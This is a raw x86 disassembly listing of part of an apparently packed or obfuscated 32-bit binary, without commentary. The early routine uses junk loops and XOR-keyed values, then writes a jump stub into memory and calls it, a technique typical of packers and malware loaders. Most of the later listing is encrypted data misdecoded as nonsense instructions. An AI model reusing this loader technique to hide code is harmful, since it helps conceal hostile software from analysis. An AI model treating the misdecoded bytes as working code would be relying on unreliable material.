  41b835:	xor    BYTE PTR [edx-0x5db322c0],0x38
  41b83c:	test   DWORD PTR [edx],esi
  41b83e:	loopne 0x41b859
  41b840:	(bad)  
  41b841:	and    al,0xa3
  41b843:	push   cs
  41b844:	cwde   
  41b845:	shr    BYTE PTR [esi+0x57],0xac
  41b849:	hlt    
  41b84a:	mov    al,0x6e
  41b84c:	sti    
  41b84d:	mov    ecx,DWORD PTR [ebp-0x4]
  41b850:	and    DWORD PTR ds:0x428ec3,0x32ec
  41b85a:	sub    eax,ecx
  41b85c:	mov    DWORD PTR [ebp-0x4],eax
  41b85f:	add    DWORD PTR ds:0x428e6b,0x1dd5
  41b869:	or     DWORD PTR [ebp-0x4],0xf89c85a0
  41b870:	xor    DWORD PTR ds:0x428e7f,ebx
  41b876:	mov    eax,DWORD PTR [ebp-0xc]
  41b879:	dec    DWORD PTR ds:0x428e67
  41b87f:	xor    eax,esi
  41b881:	or     DWORD PTR ds:0x428e33,0x9ab
  41b88b:	add    eax,edi
  41b88d:	push   eax
  41b88e:	mov    eax,DWORD PTR [ebp-0x10]
  41b891:	xor    eax,esi
  41b893:	add    DWORD PTR ds:0x428eab,0x428e6b
  41b89d:	add    eax,edi
  41b89f:	and    DWORD PTR ds:0x428e67,0x428e87
  41b8a9:	push   eax
  41b8aa:	mov    eax,DWORD PTR [ebp-0x4]
  41b8ad:	or     DWORD PTR ds:0x428e2b,0x148
  41b8b7:	xor    eax,esi
  41b8b9:	xor    DWORD PTR ds:0x428e83,0x7f59
  41b8c3:	add    eax,0x3272fa
  41b8c8:	push   eax
  41b8c9:	lea    eax,[ebp-0x78]
  41b8cc:	push   eax
  41b8cd:	push   DWORD PTR [ebp-0x2c]
  41b8d0:	push   DWORD PTR [ebp-0x28]
  41b8d3:	call   0x411af5
  41b8d8:	test   eax,eax
  41b8da:	je     0x41b908
  41b8e0:	lea    eax,[ebp-0x78]
  41b8e3:	push   eax
  41b8e4:	mov    eax,DWORD PTR [ebp-0x28]
  41b8e7:	xor    eax,esi
  41b8e9:	add    eax,edi
  41b8eb:	push   eax
  41b8ec:	mov    eax,DWORD PTR [ebp-0x24]
  41b8ef:	add    eax,0xaa
  41b8f4:	push   eax
  41b8f5:	mov    eax,DWORD PTR [ebp-0x24]
  41b8f8:	mov    eax,DWORD PTR [eax+0x198]
  41b8fe:	push   DWORD PTR [eax]
  41b900:	call   0x4061d0
  41b905:	mov    DWORD PTR [ebp-0x14],eax
  41b908:	mov    ecx,DWORD PTR ds:0x42846b
  41b90e:	lea    eax,[ebp+0x4]
  41b911:	mov    DWORD PTR [ecx*4+0x428463],eax
  41b918:	inc    DWORD PTR ds:0x42846b
  41b91e:	mov    eax,DWORD PTR [ebp-0x14]
  41b921:	test   eax,eax
  41b923:	je     0x41b995
  41b929:	lea    eax,[ebp-0x8]
  41b92c:	mov    DWORD PTR [ebp-0x34],eax
  41b92f:	mov    eax,DWORD PTR [ebp-0x30]
  41b932:	mov    DWORD PTR [ebp-0x8],eax
  41b935:	mov    eax,DWORD PTR [ebp-0x8]
  41b938:	mov    ecx,DWORD PTR [ebp-0x14]
  41b93b:	sub    eax,ecx
  41b93d:	mov    DWORD PTR [ebp-0x8],eax
  41b940:	mov    ecx,DWORD PTR [ebp-0x4]
  41b943:	xor    ecx,esi
  41b945:	mov    eax,0xffcd8d0a
  41b94a:	sub    eax,ecx
  41b94c:	add    DWORD PTR [ebp-0x8],eax
  41b94f:	mov    eax,DWORD PTR [ebp-0x14]
  41b952:	mov    DWORD PTR [eax],0x675565e9
  41b958:	mov    DWORD PTR [eax+0x4],0x76576787
  41b95f:	mov    eax,DWORD PTR [ebp-0x8]
  41b962:	mov    ecx,DWORD PTR [ebp-0x14]
  41b965:	push   DWORD PTR [ebp-0x24]
  41b968:	mov    DWORD PTR [ecx+0x1],eax
  41b96b:	mov    eax,ds:0x4281ef
  41b970:	push   DWORD PTR [eax]
  41b972:	push   DWORD PTR ds:0x428453
  41b978:	push   DWORD PTR ds:0x4281f7
  41b97e:	push   DWORD PTR ds:0x428433
  41b984:	push   DWORD PTR ds:0x428c1f
  41b98a:	push   DWORD PTR [ebp-0x28]
  41b98d:	push   DWORD PTR [ebp-0x2c]
  41b990:	mov    eax,DWORD PTR [ebp-0x14]
  41b993:	call   eax
  41b995:	pop    edi
  41b996:	pop    esi
  41b997:	leave  
  41b998:	ret    
  41b999:	push   ebp
  41b99a:	mov    ebp,esp
  41b99c:	sub    esp,0x34
  41b99f:	push   ebx
  41b9a0:	dec    edx
  41b9a1:	push   esi
  41b9a2:	push   edi
  41b9a3:	xor    ecx,ecx
  41b9a5:	xor    ecx,DWORD PTR ds:0x4292bf
  41b9ab:	mov    esi,DWORD PTR ds:0x429bb7
  41b9b1:	sub    esi,ecx
  41b9b3:	sub    ecx,DWORD PTR [ecx+esi*1]
  41b9b6:	mov    DWORD PTR [ebp-0x10],0xf89f85a5
  41b9bd:	lea    eax,[ebp+0x14]
  41b9c0:	and    DWORD PTR ds:0x428eb3,0x0
  41b9ca:	mov    esi,DWORD PTR ds:0x428eb3
  41b9d0:	inc    esi
  41b9d1:	mov    DWORD PTR ds:0x428eb3,esi
  41b9d7:	cmp    DWORD PTR ds:0x428eb3,0x6
  41b9de:	jg     0x41ba1e
  41b9e4:	jmp    0x41b9f7
  41b9e9:	push   0x428e6b
  41b9ee:	push   DWORD PTR [ebp-0x20]
  41b9f1:	call   DWORD PTR ds:0x42aa0f
  41b9f7:	cmp    DWORD PTR ds:0x428eb3,0x5
  41b9fe:	jne    0x41ba11
  41ba04:	mov    esi,DWORD PTR ds:0x428eb3
  41ba0a:	inc    esi
  41ba0b:	mov    DWORD PTR ds:0x428eb3,esi
  41ba11:	cmp    DWORD PTR ds:0x428eb3,0x1f
  41ba18:	jb     0x41b9ca
  41ba1e:	mov    DWORD PTR [ebp-0x4],eax
  41ba21:	sbb    edx,DWORD PTR ds:0x428ec7
  41ba27:	mov    DWORD PTR [ebp-0xc],0xf89c85a5
  41ba2e:	mov    DWORD PTR ds:0x428e2f,0x1d
  41ba38:	cmp    DWORD PTR ds:0x428e2f,0x0
  41ba3f:	je     0x41ba75
  41ba45:	cmp    DWORD PTR ds:0x428e2f,0x26
  41ba4c:	jle    0x41ba75
  41ba52:	jmp    0x41ba63
  41ba57:	push   DWORD PTR [ebp-0x24]
  41ba5a:	push   DWORD PTR [ebp-0x28]
  41ba5d:	call   DWORD PTR ds:0x42aa13
  41ba63:	mov    ecx,DWORD PTR ds:0x428e2f
  41ba69:	dec    ecx
  41ba6a:	mov    DWORD PTR ds:0x428e2f,ecx
  41ba70:	jmp    0x41ba38
  41ba75:	lea    eax,[ebp-0xc]
  41ba78:	and    DWORD PTR ds:0x428e5b,0x0
  41ba82:	jmp    0x41ba94
  41ba87:	mov    ecx,DWORD PTR ds:0x428e5b
  41ba8d:	inc    ecx
  41ba8e:	mov    DWORD PTR ds:0x428e5b,ecx
  41ba94:	cmp    DWORD PTR ds:0x428e5b,0x1d
  41ba9b:	jae    0x41bac3
  41baa1:	cmp    DWORD PTR ds:0x428e5b,0x2b
  41baa8:	jge    0x41bac3
  41baae:	jmp    0x41babe
  41bab3:	push   0x428e2f
  41bab8:	call   DWORD PTR ds:0x42aa17
  41babe:	jmp    0x41ba87
  41bac3:	mov    DWORD PTR [ebp-0x14],eax
  41bac6:	mov    eax,DWORD PTR [ebp-0xc]
  41bac9:	mov    esi,DWORD PTR ds:0x428e33
  41bacf:	or     DWORD PTR ds:0x428e6b,esi
  41bad5:	mov    edx,DWORD PTR [ebp-0x14]
  41bad8:	and    DWORD PTR ds:0x428e77,0x0
  41bae2:	jmp    0x41baf4
  41bae7:	mov    ecx,DWORD PTR ds:0x428e77
  41baed:	inc    ecx
  41baee:	mov    DWORD PTR ds:0x428e77,ecx
  41baf4:	cmp    DWORD PTR ds:0x428e77,0x19
  41bafb:	jae    0x41bb3b
  41bb01:	cmp    DWORD PTR ds:0x428e77,0x9
  41bb08:	jle    0x41bb3b
  41bb0e:	jmp    0x41bb1c
  41bb13:	push   DWORD PTR [ebp-0x28]
  41bb16:	call   DWORD PTR ds:0x42aa1b
  41bb1c:	cmp    DWORD PTR ds:0x428e77,0x8
  41bb23:	jne    0x41bb36
  41bb29:	mov    ecx,DWORD PTR ds:0x428e77
  41bb2f:	inc    ecx
  41bb30:	mov    DWORD PTR ds:0x428e77,ecx
  41bb36:	jmp    0x41bae7
  41bb3b:	mov    ecx,0x75108af
  41bb40:	mov    esi,DWORD PTR ds:0x428e33
  41bb46:	add    DWORD PTR ds:0x428e47,esi
  41bb4c:	xor    eax,ecx
  41bb4e:	sub    DWORD PTR ds:0x428e6f,0x2684
  41bb58:	add    eax,0x3272f6
  41bb5d:	mov    DWORD PTR [edx],eax
  41bb5f:	sbb    eax,eax
  41bb61:	mov    eax,ds:0x4281eb
  41bb66:	mov    DWORD PTR ds:0x428e8b,0x1a
  41bb70:	cmp    DWORD PTR ds:0x428e8b,0x0
  41bb77:	je     0x41bbcc
  41bb7d:	cmp    DWORD PTR ds:0x428e8b,0xd
  41bb84:	jge    0x41bbcc
  41bb8a:	jmp    0x41bba0
  41bb8f:	push   DWORD PTR [ebp-0x18]
  41bb92:	push   0x428eab
  41bb97:	push   DWORD PTR [ebp-0x10]
  41bb9a:	call   DWORD PTR ds:0x42aa1f
  41bba0:	cmp    DWORD PTR ds:0x428e8b,0xe
  41bba7:	jne    0x41bbba
  41bbad:	mov    edx,DWORD PTR ds:0x428e8b
  41bbb3:	dec    edx
  41bbb4:	mov    DWORD PTR ds:0x428e8b,edx
  41bbba:	mov    edx,DWORD PTR ds:0x428e8b
  41bbc0:	dec    edx
  41bbc1:	mov    DWORD PTR ds:0x428e8b,edx
  41bbc7:	jmp    0x41bb70
  41bbcc:	mov    edx,DWORD PTR [ebp-0x4]
  41bbcf:	or     esi,0x7d03
  41bbd5:	mov    eax,DWORD PTR [eax]
  41bbd7:	mov    DWORD PTR ds:0x428ebf,0x12
  41bbe1:	cmp    DWORD PTR ds:0x428ebf,0x0
  41bbe8:	je     0x41bc1d
  41bbee:	cmp    DWORD PTR ds:0x428ebf,0x18
  41bbf5:	jl     0x41bc1d
  41bbfb:	jmp    0x41bc0b
  41bc00:	push   0x428000
  41bc05:	call   DWORD PTR ds:0x42a9eb
  41bc0b:	mov    esi,DWORD PTR ds:0x428ebf
  41bc11:	dec    esi
  41bc12:	mov    DWORD PTR ds:0x428ebf,esi
  41bc18:	jmp    0x41bbe1
  41bc1d:	add    eax,DWORD PTR [edx]
  41bc1f:	mov    DWORD PTR [ebp-0x8],eax
  41bc22:	mov    esi,DWORD PTR [ebp+0x8]
  41bc25:	mov    eax,ds:0x428373
  41bc2a:	and    DWORD PTR ds:0x428e33,0x0
  41bc34:	jmp    0x41bc46
  41bc39:	mov    edx,DWORD PTR ds:0x428e33
  41bc3f:	inc    edx
  41bc40:	mov    DWORD PTR ds:0x428e33,edx
  41bc46:	cmp    DWORD PTR ds:0x428e33,0x1c
  41bc4d:	jae    0x41bc8f
  41bc53:	cmp    DWORD PTR ds:0x428e33,0x8
  41bc5a:	jbe    0x41bc8f
  41bc60:	jmp    0x41bc70
  41bc65:	push   0x428189
  41bc6a:	call   DWORD PTR ds:0x42a9ef
  41bc70:	cmp    DWORD PTR ds:0x428e33,0x7
  41bc77:	jne    0x41bc8a
  41bc7d:	mov    edx,DWORD PTR ds:0x428e33
  41bc83:	inc    edx
  41bc84:	mov    DWORD PTR ds:0x428e33,edx
  41bc8a:	jmp    0x41bc39
  41bc8f:	mov    eax,DWORD PTR [eax+0x198]
  41bc95:	and    DWORD PTR ds:0x428eaf,0x0
  41bc9f:	mov    edx,DWORD PTR ds:0x428eaf
  41bca5:	inc    edx
  41bca6:	mov    DWORD PTR ds:0x428eaf,edx
  41bcac:	cmp    DWORD PTR ds:0x428eaf,0x19
  41bcb3:	jbe    0x41bcd6
  41bcb9:	jmp    0x41bcc9
  41bcbe:	push   0x5031
  41bcc3:	call   DWORD PTR ds:0x42a9f3
  41bcc9:	cmp    DWORD PTR ds:0x428eaf,0x10
  41bcd0:	jb     0x41bc9f
  41bcd6:	xor    esi,ecx
  41bcd8:	mov    edx,0x3272f6
  41bcdd:	add    esi,edx
  41bcdf:	mov    DWORD PTR ds:0x428e7f,0x53fd
  41bce9:	cmp    DWORD PTR [eax],esi
  41bceb:	mov    DWORD PTR ds:0x428e27,0x6856
  41bcf5:	je     0x41bd16
  41bcfb:	mov    DWORD PTR ds:0x428e6f,0x6d53
  41bd05:	mov    eax,DWORD PTR [eax]
  41bd07:	mov    DWORD PTR ds:0x428e5f,0xa8d
  41bd11:	jmp    0x420797
  41bd16:	or     DWORD PTR ds:0x428ec7,ecx
  41bd1c:	mov    eax,DWORD PTR [ebp+0x18]
  41bd1f:	mov    esi,DWORD PTR ds:0x428e47
  41bd25:	adc    esi,DWORD PTR ds:0x428eb3
  41bd2b:	mov    DWORD PTR ds:0x428e47,esi
  41bd31:	mov    esi,DWORD PTR [ebp+0x1c]
  41bd34:	add    DWORD PTR ds:0x428e7f,0x428e53
  41bd3e:	or     ebx,0xffffffff
  41bd41:	jmp    0x41e0ba
  41bd46:	scas   al,BYTE PTR es:[edi]
  41bd47:	fwait
  41bd48:	or     ah,BYTE PTR [esi+eax*1-0x1c]
  41bd4c:	mov    WORD PTR [ecx-0x36abec4b],ds
  41bd52:	fs dec ecx
  41bd54:	fdiv   QWORD PTR [eax-0x7c7d02d9]
  41bd5a:	daa    
  41bd5b:	pusha  
  41bd5c:	add    DWORD PTR [ebx-0x3627b6e1],0xffffffdd
  41bd63:	retf   0xf34b
  41bd66:	loopne 0x41bd1c
  41bd68:	out    dx,al
  41bd69:	les    esp,FWORD PTR [eax+0x22df4aac]
  41bd6f:	stos   DWORD PTR es:[edi],eax
  41bd70:	scas   al,BYTE PTR es:[edi]
  41bd71:	test   eax,0x14a86cf7
  41bd76:	push   cs
  41bd77:	push   esi
  41bd78:	mov    al,ds:0xd869db7e
  41bd7d:	out    0x1e,al
  41bd7f:	sbb    BYTE PTR [ebp+0x76],dh
  41bd82:	dec    esp
  41bd83:	xor    eax,0xa5a24d51
  41bd88:	jno    0x41bdb0
  41bd8a:	sub    al,0x18
  41bd8c:	adc    DWORD PTR [edi+0x63],0xffffffe5
  41bd90:	ins    DWORD PTR es:[edi],dx
  41bd91:	dec    edi
  41bd92:	push   ss
  41bd93:	imul   esi,DWORD PTR [eax-0x80],0x4e7d2eca
  41bd9a:	imul   eax,DWORD PTR [ecx],0x3
  41bd9d:	lahf   
  41bd9e:	or     ch,dh
  41bda0:	mov    ?,edx
  41bda2:	test   al,0x57
  41bda4:	xchg   DWORD PTR [ebp+0x333bd3dc],esp
  41bdaa:	mov    BYTE PTR ds:0x43dbc1a7,al
  41bdb0:	and    BYTE PTR [esi],dl
  41bdb2:	ins    DWORD PTR es:[edi],dx
  41bdb3:	jmp    0x41be15
  41bdb5:	jg     0x41bd9b
  41bdb7:	sbb    ch,BYTE PTR ds:0xbc05fff1
  41bdbd:	push   ebx
  41bdbe:	ficom  DWORD PTR [eax-0x45ae66f]
  41bdc4:	das    
  41bdc5:	addr16 mov edx,0x3fbb766e
  41bdcb:	pop    ds
  41bdcc:	in     eax,0xbd
  41bdce:	lods   al,BYTE PTR ds:[esi]
  41bdcf:	jmp    0x3c12:0xd54fe906
  41bdd6:	fld    QWORD PTR [edi]
  41bdd8:	pop    es
  41bdd9:	out    0xe3,eax
  41bddb:	lods   al,BYTE PTR ds:[esi]
  41bddc:	call   0x31a08af8
  41bde1:	out    0xc9,eax
  41bde3:	sub    DWORD PTR [ebp+0x1dad987f],ecx
  41bde9:	xor    BYTE PTR [ecx],ch
  41bdeb:	popf   
  41bdec:	mov    dh,0x54
  41bdee:	cs jmp 0x1495:0x1aab948f
  41bdf6:	xchg   esi,eax
  41bdf7:	fstp   TBYTE PTR [edx+0x7b8d91e7]
  41bdfd:	mov    ah,0x44
  41bdff:	out    0x71,al
  41be01:	adc    eax,0x959fb8f5
  41be06:	mov    DWORD PTR [ebx+0x30],eax
  41be09:	hlt    
  41be0a:	push   es
  41be0b:	mov    ecx,DWORD PTR es:[ecx]
  41be0e:	cmp    eax,0x57b9d1f
  41be13:	dec    eax
  41be14:	cli    
  41be15:	test   eax,0xd4016962
  41be1a:	data16 ja 0x41be22
  41be1d:	adc    eax,0xbbd29d2e
  41be22:	sar    DWORD PTR [ebx-0x37c7b0f2],0x1b
  41be29:	sub    cl,dh
  41be2b:	pop    ds
  41be2c:	imul   esi,DWORD PTR [ebp-0x1],0x456c2637
  41be33:	gs hlt 
  41be35:	mov    ch,0x3a
  41be37:	dec    edi
  41be38:	es pop ecx
  41be3a:	jge    0x41bdd0
  41be3c:	jae    0x41be54
  41be3e:	clc    
  41be3f:	cmp    al,0x42
  41be41:	call   0x3829118e
  41be46:	fisubr WORD PTR ds:0x6f6e25da
  41be4c:	rcl    DWORD PTR [edi-0x5f],cl
  41be4f:	lds    ecx,FWORD PTR [esi+0x1726450c]
  41be55:	pop    esi
  41be56:	pop    ebp
  41be57:	ja     0x41be47
  41be59:	ss inc edi
  41be5b:	or     edi,DWORD PTR [edi+eax*4-0x6f3fda29]
  41be62:	repnz (bad) [edx]
  41be65:	jecxz  0x41be92
  41be67:	nop
  41be68:	push   ss
  41be69:	xor    WORD PTR [ebx],0xd489
  41be6e:	dec    esi
  41be6f:	jg     0x41bec4
  41be71:	dec    eax
  41be72:	cmp    eax,0x3cc5f85f
  41be77:	jbe    0x41be95
  41be79:	fdivr  QWORD PTR [eax-0x2adc3a87]
  41be7f:	and    al,0x6e
  41be81:	xchg   BYTE PTR [edx-0x7cb79166],al
  41be87:	jl     0x41bf01
  41be89:	ins    DWORD PTR es:[edi],dx
  41be8a:	inc    edi
  41be8b:	jecxz  0x41becd
  41be8d:	or     al,0xbb
  41be8f:	add    esp,ebx
  41be91:	shr    DWORD PTR [eax+0x46],0x8e
  41be95:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41be96:	test   al,0xdc
  41be98:	adc    cl,0x13
  41be9b:	test   DWORD PTR [edx],esi
  41be9d:	mov    edi,0xf646eea3
  41bea2:	inc    esp
  41bea3:	imul   eax,DWORD PTR [edx-0x6a],0x2d
  41bea7:	gs push esi
  41bea9:	(bad)  [eax-0x34]
  41beac:	pop    ecx
  41bead:	push   esp
  41beae:	jb     0x41bf10
  41beb0:	mov    al,ds:0x4c3b9092
  41beb5:	mov    edi,0x5639315f
  41beba:	sbb    dh,BYTE PTR [ebp+0x3dae5f4f]
  41bec0:	push   edi
  41bec1:	outs   dx,DWORD PTR ds:[esi]
  41bec2:	fsub   st(7),st
  41bec4:	ror    cl,cl
  41bec6:	push   ss
  41bec7:	sbb    al,0x8d
  41bec9:	inc    esi
  41beca:	fwait
  41becb:	addr16 mov eax,0x449f127
  41bed1:	lods   eax,DWORD PTR ds:[esi]
  41bed2:	ret    
  41bed3:	lds    esp,FWORD PTR [esi+edx*4-0x562e1ad]
  41beda:	cmp    DWORD PTR [edx+0x37],esp
  41bedd:	imul   edi,DWORD PTR [edx+0x75f41691],0x6250fdc4
  41bee7:	jge    0x41bf3d
  41bee9:	(bad)  
  41beea:	xchg   ecx,eax
  41beeb:	jl     0x41bf5b
  41beed:	mov    bh,0x9
  41beef:	enter  0x73a1,0x2e
  41bef3:	ins    DWORD PTR es:[edi],dx
  41bef4:	fisttp QWORD PTR gs:[edx-0x69]
  41bef8:	les    edx,FWORD PTR [edx+0x33c07dd9]
  41befe:	push   edi
  41beff:	retf   
  41bf00:	or     al,0x7e
  41bf02:	jbe    0x41bf7b
  41bf04:	or     al,0x12
  41bf06:	sbb    ebx,DWORD PTR [eax]
  41bf08:	push   0xffffffa7
  41bf0a:	sub    DWORD PTR [esi],ecx
  41bf0c:	pop    edx
  41bf0d:	pop    eax
  41bf0e:	pop    edi
  41bf0f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bf10:	repnz cdq 
  41bf12:	add    DWORD PTR [ebx],esi
  41bf14:	push   0xb
  41bf16:	cs es inc ebx
  41bf19:	or     ebp,esi
  41bf1b:	xor    DWORD PTR [ebx+ebx*2+0x2],edi
  41bf1f:	jp     0x41bec2
  41bf21:	cmp    DWORD PTR [ebp+0x5cc7b963],ebx
  41bf27:	push   es
  41bf28:	nop
  41bf29:	mov    eax,ds:0xc431fd6d
  41bf2e:	call   0x7fd4:0x99922775
  41bf35:	ret    0xa01a
  41bf38:	xchg   BYTE PTR [eax+ebx*8-0x56],cl
  41bf3c:	mov    ebp,0xd97590a1
  41bf41:	or     BYTE PTR [edx-0x2b],dl
  41bf44:	imul   ebx,DWORD PTR [edx+0x5b0926d],0x48f6086d
  41bf4e:	and    al,dl
  41bf50:	in     eax,0x9f
  41bf52:	adc    eax,0x3c70e733
  41bf57:	inc    esp
  41bf58:	(bad)  
  41bf59:	loope  0x41bf70
  41bf5b:	inc    ebx
  41bf5c:	out    0x7a,eax
  41bf5e:	jg     0x41bf59
  41bf60:	fistp  DWORD PTR [ecx]
  41bf62:	pop    edi
  41bf63:	iret   
  41bf64:	int3   
  41bf65:	push   esp
  41bf66:	inc    edx
  41bf67:	dec    ecx
  41bf68:	loop   0x41bf88
  41bf6a:	xor    edi,ebx
  41bf6c:	pop    edx
  41bf6d:	jnp    0x41bf09
  41bf6f:	cmp    eax,0xd077c78a
  41bf74:	jae    0x41bfa2
  41bf76:	rol    BYTE PTR [eax+0x53],1
  41bf79:	cmp    al,0x26
  41bf7b:	shl    BYTE PTR [ebx-0x124b3dbc],1
  41bf81:	gs loopne 0x41bfaa
  41bf84:	mov    bh,0xf5
  41bf86:	aas    
  41bf87:	scas   al,BYTE PTR es:[edi]
  41bf88:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bf89:	sub    al,0xf6
  41bf8b:	imul   ebp,ebp,0x4b
  41bf8e:	test   DWORD PTR [edi+0x35631fe1],ecx
  41bf94:	inc    ecx
  41bf95:	lea    edx,[esi+0x7be05404]
  41bf9b:	mul    BYTE PTR ds:[ebp-0x12]
  41bf9f:	cs sbb eax,0x4f9edbf7
  41bfa5:	mov    dl,0x7b
  41bfa7:	mov    bl,0xb1
  41bfa9:	popf   
  41bfaa:	mov    DWORD PTR [ecx-0x4a],ebx
  41bfad:	pop    ebx
  41bfae:	sbb    edi,0x31
  41bfb1:	adc    eax,0x52b8f5da
  41bfb6:	push   0xcc36c7c4
  41bfbb:	jmp    0x42559e27
  41bfc0:	fimul  DWORD PTR [edi+eiz*4+0x2d]
  41bfc4:	jne    0x41bf60
  41bfc6:	mov    cl,0xb7
  41bfc8:	arpl   WORD PTR [ebx+esi*1],di
  41bfcb:	mov    bh,dh
  41bfcd:	add    BYTE PTR [ebx+0x74],al
  41bfd0:	jns    0x41c00b
  41bfd2:	mov    esi,0x1a7e06bd
  41bfd7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bfd8:	es jecxz 0x41bfc0
  41bfdb:	ret    0x5716
  41bfde:	fstp   TBYTE PTR [ebp-0x50]
  41bfe1:	dec    esi
  41bfe2:	int3   
  41bfe3:	(bad)  
  41bfe4:	das    
  41bfe5:	push   ss
  41bfe6:	mov    ebx,0x69eef82f
  41bfeb:	popf   
  41bfec:	out    dx,al
  41bfed:	jns    0x41c06b
  41bfef:	mov    ?,eax
  41bff1:	cwde   
  41bff2:	cmp    edi,DWORD PTR [ebx]
  41bff4:	js     0x41c072
  41bff6:	or     al,0xb6
  41bff8:	add    al,0x2
  41bffa:	jecxz  0x41c020
  41bffc:	push   es
  41bffd:	xor    edx,0x5e53cd6
  41c003:	push   edx
  41c004:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  41c006:	xchg   ah,bh
  41c008:	and    edi,0xf00ae540
  41c00e:	mul    DWORD PTR [edx]
  41c010:	rol    BYTE PTR [ebx],cl
  41c012:	(bad)  
  41c013:	mov    gs,edi
  41c015:	neg    DWORD PTR [ecx-0x80]
  41c018:	in     al,0xf0
  41c01a:	arpl   WORD PTR [edx+0x3b],si
  41c01d:	cmp    ebp,DWORD PTR [ebp-0x26]
  41c020:	inc    edx
  41c021:	(bad)  
  41c022:	hlt    
  41c023:	test   DWORD PTR [edi-0x3b67f497],esp
  41c029:	mov    DWORD PTR [edi],esp
  41c02b:	push   ebx
  41c02c:	rcl    DWORD PTR [edi+0x5e],1
  41c02f:	es int3 
  41c031:	xchg   ebx,eax
  41c032:	adc    eax,0xf89f373d
  41c037:	mov    ds:0xf2be571a,al
  41c03c:	neg    DWORD PTR [edx]
  41c03e:	leave  
  41c03f:	sbb    al,0x8c
  41c041:	xchg   ch,bl
  41c043:	popf   
  41c044:	and    bl,BYTE PTR [edx+0x53]
  41c047:	bound  ebx,QWORD PTR [edx-0x31e026bd]
  41c04d:	retf   
  41c04e:	inc    ebx
  41c04f:	push   edi
  41c050:	mov    eax,gs:0xea4a3bd0
  41c056:	inc    ebx
  41c057:	and    ah,BYTE PTR [esi+ebx*8]
  41c05a:	jecxz  0x41c03d
  41c05c:	and    ah,BYTE PTR [edi+0x2c]
  41c05f:	lods   eax,DWORD PTR ds:[esi]
  41c060:	rcl    DWORD PTR [edi],1
  41c062:	retf   
  41c063:	sbb    BYTE PTR [ecx-0x5e88ca69],ch
  41c069:	jmp    FWORD PTR [edx+0x473c1860]
  41c06f:	dec    edx
  41c070:	in     al,dx
  41c071:	jl     0x41c0d0
  41c073:	inc    eax
  41c074:	int    0xf4
  41c076:	and    al,0x56
  41c078:	bound  esi,QWORD PTR [ebx+0x64]
  41c07b:	sub    BYTE PTR [ecx],dl
  41c07d:	jae    0x41c0c1
  41c07f:	and    DWORD PTR [ebp+ebp*1+0x3a],ebp
  41c083:	sbb    al,al
  41c085:	loope  0x41c0fd
  41c087:	mov    bh,0x8f
  41c089:	xor    al,0x95
  41c08b:	idiv   BYTE PTR [ebp-0x41]
  41c08e:	sahf   
  41c08f:	and    bh,BYTE PTR [eax-0x5d]
  41c092:	jmp    0x210c:0xeef7b237
  41c099:	leave  
  41c09a:	lds    edx,FWORD PTR [edx-0x6ebf2cf9]
  41c0a0:	and    eax,0xf5c636d2
  41c0a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c0a6:	dec    eax
  41c0a7:	in     al,dx
  41c0a8:	iret   
  41c0a9:	mov    bl,0xc1
  41c0ab:	inc    edx
  41c0ac:	add    ebx,DWORD PTR [ebx]
  41c0ae:	mov    ds:0xab6a4de9,eax
  41c0b3:	test   BYTE PTR [ebx-0x4b818d42],al
  41c0b9:	out    dx,al
  41c0ba:	add    al,0x59
  41c0bc:	xchg   ebp,eax
  41c0bd:	mov    ss,WORD PTR [eax]
  41c0bf:	ds mov bl,cl
  41c0c2:	adc    edx,eax
  41c0c4:	lods   al,BYTE PTR ds:[esi]
  41c0c5:	and    eax,0x493a588e
  41c0ca:	popf   
  41c0cb:	push   0xd9bbcf61
  41c0d0:	stc    
  41c0d1:	retf   0x3eee
  41c0d4:	dec    edx
  41c0d5:	(bad)  
  41c0d6:	call   0x625d9fb8
  41c0db:	xchg   esi,eax
  41c0dc:	stc    
  41c0dd:	mov    DWORD PTR [eax-0x7e19fc60],edi
  41c0e3:	jb     0x41c0cd
  41c0e5:	xor    BYTE PTR [ecx],cl
  41c0e7:	arpl   WORD PTR [edx],bp
  41c0e9:	jbe    0x41c15e
  41c0eb:	call   DWORD PTR [eax+edi*2]
  41c0ee:	pop    esi
  41c0ef:	aam    0xd4
  41c0f1:	cwde   
  41c0f2:	pop    edx
  41c0f3:	adc    BYTE PTR [eax],0x93
  41c0f6:	push   es
  41c0f7:	into   
  41c0f8:	mov    BYTE PTR [edi+0x48],cl
  41c0fb:	jg     0x41c117
  41c0fd:	ret    0x3d7f
  41c100:	lods   eax,DWORD PTR ds:[esi]
  41c101:	gs sbb bh,al
  41c104:	or     BYTE PTR [edi+edi*1],cl
  41c107:	clc    
  41c108:	xor    al,0xc1
  41c10a:	out    dx,al
  41c10b:	adc    al,0xb6
  41c10d:	xchg   ebp,eax
  41c10e:	in     al,dx
  41c10f:	inc    ebp
  41c110:	lahf   
  41c111:	jnp    0x41c17d
  41c113:	arpl   WORD PTR ss:[ebp+0x5de7c6fd],sp
  41c11a:	fs ss mov al,0xc3
  41c11e:	(bad)  
  41c11f:	pop    ss
  41c120:	pop    edi
  41c121:	(bad)  
  41c122:	cmp    ebx,esp
  41c124:	lahf   
  41c125:	mov    WORD PTR [ecx],ss
  41c127:	ret    0x64ee
  41c12a:	ins    DWORD PTR es:[edi],dx
  41c12b:	fstp   QWORD PTR ds:0xa94fa4f2
  41c131:	(bad)  
  41c132:	clc    
  41c133:	das    
  41c134:	aaa    
  41c135:	or     ecx,ebx
  41c137:	inc    edi
  41c138:	jbe    0x41c127
  41c13a:	rcl    esi,cl
  41c13c:	stos   DWORD PTR es:[edi],eax
  41c13d:	lea    ecx,[ecx]
  41c13f:	push   esp
  41c140:	or     al,0xcb
  41c142:	jl     0x41c153
  41c144:	add    BYTE PTR [ebp+0x18],bh
  41c147:	dec    ecx
  41c148:	data16 fadd st(2),st
  41c14b:	sub    edi,eax
  41c14d:	xor    al,0x6
  41c14f:	dec    eax
  41c150:	add    DWORD PTR [esi-0x61],0x14
  41c154:	aaa    
  41c155:	(bad)  
  41c156:	repnz xlat BYTE PTR ds:[ebx]
  41c158:	dec    esp
  41c159:	shr    bh,cl
  41c15b:	dec    esp
  41c15c:	out    dx,al
  41c15d:	or     bh,bh
  41c15f:	out    dx,eax
  41c160:	pusha  
  41c161:	clc    
  41c162:	dec    ebx
  41c163:	dec    ebx
  41c164:	cmp    DWORD PTR [edx+0x18],ebp
